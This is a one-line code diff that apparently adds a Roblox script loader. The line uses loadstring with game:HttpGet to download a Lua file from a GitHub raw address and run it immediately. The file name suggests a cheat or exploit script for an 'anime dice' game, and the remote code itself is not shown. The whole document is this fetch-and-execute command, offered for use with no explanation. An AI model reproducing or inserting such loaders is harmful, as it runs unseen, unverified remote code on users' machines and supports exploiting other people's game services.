@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/anime-dice-spam7-nw0h2wptl6u2fs.lua"))()
